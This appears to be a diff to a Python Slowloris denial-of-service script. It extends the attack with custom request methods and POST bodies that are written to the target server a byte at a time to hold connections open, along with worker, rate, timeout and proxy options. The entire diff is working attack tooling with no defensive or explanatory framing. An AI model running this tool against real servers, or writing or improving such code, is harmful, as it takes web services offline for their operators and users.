@@ -24,12 +24,14 @@ DEFAULT_HEADERS = {
 
 parser = argparse.ArgumentParser()
 parser.add_argument('url')
+parser.add_argument('--workers', type=int, default=8, help='(default: %(default)s)')
+parser.add_argument('--interval', type=float, default=1, metavar='SECONDS', help='interval between requests (default: %(default)s)')
+parser.add_argument('--timeout', type=float, default=15, metavar='SECONDS', help='connection timeout (default: %(default)s)')
+parser.add_argument('--read-rate', type=float, default=0.05, metavar='SECONDS', help='bytes/second (default: %(default)s)')
+parser.add_argument('--write-rate', type=float, default=0.05, metavar='SECONDS', help='bytes/second (default: %(default)s)')
 parser.add_argument('-H', '--header', action='append', default=[], help='add custom header')
-parser.add_argument('--workers', type=int, default=8, help='default: %(default)s')
-parser.add_argument('--interval', type=float, default=1, metavar='SECONDS', help='interval between requests default: %(default)s')
-parser.add_argument('--timeout', type=float, default=15, metavar='SECONDS', help='connection timeout default: %(default)s')
-parser.add_argument('--read-rate', type=float, default=0.05, metavar='SECONDS', help='bytes/second default: %(default)s')
-parser.add_argument('--write-rate', type=float, default=0.05, metavar='SECONDS', help='bytes/second default: %(default)s')
+parser.add_argument('-X', '--request', default='GET', help='request method (default: %(default)s)')
+parser.add_argument('-d', '--data', action='append', default=[])
 parser.add_argument('-x', '--proxy')
 args = parser.parse_args()
 
@@ -63,7 +65,10 @@ def slowloris_timeout(timeout):
 
 async def slowloris_write(writer, data, rate):
     for char in data:
-        writer.write(char.encode())
+        if type(char) == str:
+            writer.write(char.encode())
+        else:
+            writer.write(char.to_bytes())
         await writer.drain()
         await asyncio.sleep(rate)
 
@@ -115,17 +120,22 @@ async def slowloris_attack_loop(*args, **kwargs):
             else:
                 print(f'{e.__class__.__name__}')
 
-async def slowloris_attack(host, port, read_rate, write_rate, https, path, headers_list, proxy, interval):
+async def slowloris_attack(host, port, read_rate, write_rate, https, path, headers_list, proxy, interval, request_method, data_list):
     reader, writer = await slowloris_open(host, port, https, proxy)
     headers = DEFAULT_HEADERS
     headers['Host'] = host
     headers['User-Agent'] = random.choice(USER_AGENTS)
+
+    raw_data = '&'.join(data_list).encode()
 
     for h in headers_list:
         data = h.split(':')
         headers[data[0].strip()] = (':'.join(data[1:])).strip()
 
     headers['Connection'] = 'keep-alive'
+
+    if len(raw_data) > 0:
+        headers['Content-Length'] = len(raw_data)
 
     if path is None or len(path) == 0:
         path = '/'
@@ -134,12 +144,15 @@ async def slowloris_attack(host, port, read_rate, write_rate, https, path, heade
 
         time_write_start = time.time()
 
-        await slowloris_write(writer, f'GET {path} HTTP/1.1\r\n', write_rate)
+        await slowloris_write(writer, f'{request_method} {path} HTTP/1.1\r\n', write_rate)
 
         for k,v in headers.items():
             await slowloris_write(writer, f'{k}: {v}\r\n', write_rate)
 
         await slowloris_write(writer, '\r\n', write_rate)
+
+        if len(raw_data) > 0:
+            await slowloris_write(writer, raw_data, write_rate)
 
         print(f'Sent http request in {time.time()-time_write_start} seconds')
 
@@ -177,4 +190,6 @@ asyncio.run(run(
     headers_list=args.header,
     proxy=args.proxy,
     interval=args.interval,
+    request_method=args.request,
+    data_list=args.data,
 ))
